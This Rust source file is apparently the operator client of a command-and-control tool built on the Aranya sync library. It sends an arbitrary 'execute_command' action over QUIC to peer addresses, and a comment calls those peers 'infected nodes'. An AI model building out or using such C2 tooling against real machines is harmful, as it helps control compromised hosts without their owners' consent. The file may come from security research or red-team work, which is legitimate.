mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    io::Write,
    net::{IpAddr, Ipv4Addr, SocketAddr},
    path::Path,
    fs,
    str::FromStr,
    sync::Arc,
    time::Duration
};

use aranya_policy_vm::{Text, text};
use aranya_runtime::{Sink, VmEffect, vm_action};
use clap::Parser;
use tokio::sync::Mutex;

use crate::{c2syncer::{C2Syncer, c2push, c2sync, new_quic_client}, common::C2Client};

struct OperatorSink {}

impl Sink<VmEffect> for OperatorSink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, _effect: VmEffect) {
        // NOTE: No operation
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

// async fn afc_listener() {
//     let listener = std::net::TcpListener::bind("127.0.0.1:4446").unwrap();

//     for stream in listener.incoming() {
//         let mut buffer = [0; 1024];

//         match stream.unwrap().read(&mut buffer) {
//             Ok(n) => {
//                 println!("Data: {:?}", &buffer[..n]);
//             }
//             Err(_) => {}
//         }

//         // if let Ok(Some(req)) = stream.unwrap().receive().await {
//         // println!("{:?}", req);
//         // }
//     }
// }

#[derive(Parser)]
struct CommandArguments {
    #[arg(long)]
    new_graph: bool,

    // TODO: Is this even possible ?
    // #[arg(long)]
    // list_commands: bool,

    #[arg(long)]
    config_dir: String,

    #[arg(long)]
    command: Option<String>,

    #[arg(help = "Peer Addresses e.g. 127.0.0.1:4445")]
    args: Vec<String>
}

#[tokio::main]
async fn main() {
    // Enable logging to terminal
    tracing_subscriber::fmt::init();

    let args = CommandArguments::parse();

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    // let rt = tokio::runtime::Builder::new_multi_thread()
    //     .thread_stack_size(100 * 1024 * 1024)
    //     .enable_all()
    //     .build()
    //     .unwrap();

    let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 3)), 4445);

    let dir = Path::new(&args.config_dir);

    let _ = fs::create_dir(&dir);
    // TODO: {} required here or no ?
    let mut sink = OperatorSink {};
    let mut aranya = C2Client::new(dir);
    // let keys = aranya.create_new_keys(dir);
    
    let keys = match args.new_graph {
        true => {
            aranya.new_engine();
            aranya.create_new_keys()
        },
        false => {
            aranya.load_keys()
        }
    };

    let deviceid = keys.ident_key.id().unwrap();
    let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
    let mut clientstate = aranya.init_aranya(policy);

    if args.new_graph {
        let graph = match aranya.create_graph(&mut clientstate, &mut sink, &keys) {
            Ok(v) => v,
            Err(_) => return
        };

        // TODO: Temporary debug code for infected nodes to quickly
        //   connect up to the same graph ID
        fs::write("src/graph.txt", graph.as_array());
    }

    if let Some(command) = args.command {
        let txt = Text::from_str(&command).unwrap();
        clientstate.action(
            aranya.get_graph(),
            &mut sink,
            vm_action!(execute_command(txt))
        );

        let quic = {
            let mut syncbind = bind.clone();
            syncbind.set_port(4446);
            Arc::new(new_quic_client(syncbind))
        };

        let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));

        for ipstr in args.args {
            let socket: SocketAddr = ipstr.parse().expect("Invalid IP format");
            c2push(socket, Arc::clone(&quic), Arc::clone(&syncer), aranya.get_graph()).await;
            println!("SYNCED");
        }
        
        // TODO: This sleep is very important becasue without it, the
        //   program will end and the data won't be transferred to
        //   some of the peers, if any at all.
        tokio::time::sleep(Duration::from_millis(1000)).await;
    }

    // let graph = aranya.create_graph(&dir, &mut cs, &mut sink, &keys);

    // let mut file = std::fs::File::create(dir.join(Path::new("config.yaml"))).expect("Cannot open file");
    // let mut contents = String::new();
    // file.read_to_string(&mut contents);

    // let s = serde_yaml::from_str::<std::collections::BTreeMap<String, String>>(&contents).expect("YAML deserialisation failure");
    // println!("{:?}", s.get("hi"));

    // println!("{:?}", graph);

    // rt.block_on(async move {
    //     // if args.new_graph {
    //     //     let graph = match aranya.create_graph().await {
    //     //         Ok(v) => v,
    //     //         Err(_) => {
    //     //             print!("Failed to create Aranya graph...");
    //     //             return;
    //     //         }
    //     //     };

    //     //     let mut file = std::fs::File::create("src/graph.txt").unwrap();
    //     //     file.write_all(graph.as_array()).expect("Failed to write to debug graph.txt");
    //     // }

    //     let quica = {
    //         let mut syncbind = bind.clone();
    //         syncbind.set_port(4446);
    //         Arc::new(new_quic_client(syncbind))
    //     };

    //     // TODO: Insane testing environemnt skills
    //     // TODO: End skills

    //     // TODO: AFC Test

    //     // tokio::spawn(async {
    //     //     afc_listener().await;
    //     // });

    //     // TODO: End AFC Test
    // });
}
